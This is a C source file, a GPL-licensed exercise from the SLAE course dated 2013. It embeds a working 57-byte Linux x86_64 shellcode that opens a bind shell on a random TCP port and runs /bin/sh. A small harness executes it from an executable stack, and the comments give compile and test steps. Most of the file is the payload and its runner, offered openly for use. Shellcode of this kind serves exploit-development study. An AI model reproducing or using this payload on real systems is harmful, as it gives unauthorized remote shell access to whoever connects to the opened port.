/*

 Shell Bind TCP Random Port Shellcode - C Language - Linux/x86_64
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>

*/


/*

   shell_bind_tcp_random_port_shellcode_x86_64
     assembly source: https://github.com/geyslan/SLAE/blob/master/improvements/shell_bind_tcp_random_port_x86_64.asm

   * 57 bytes
   * null-free


   # gcc -m64 -fno-stack-protector -z execstack shell_bind_tcp_random_port_shellcode_x86_64.c -o shell_bind_tcp_random_port_shellcode_x86_64

   Testing
   # ./shell_bind_tcp_random_port_shellcode_x86_64
   # netstat -anp | grep shell
   # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
   # nc 127.0.0.1 port

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02"
"\x5f\xb0\x29\x0f\x05\x52\x5e\x50\x5f\xb0"
"\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
"\x57\x54\x5f\xb0\x3b\x0f\x05";

main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(code));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("mov $0xffffffffffffffff, %rax\n\t"
         "mov %rax, %rbx\n\t"
         "mov %rax, %rcx\n\t"
         "mov %rax, %rdx\n\t"
         "mov %rax, %rsi\n\t"
         "mov %rax, %rdi\n\t"
         "mov %rax, %rbp\n\t"

    // Calling the shellcode
         "call code");

}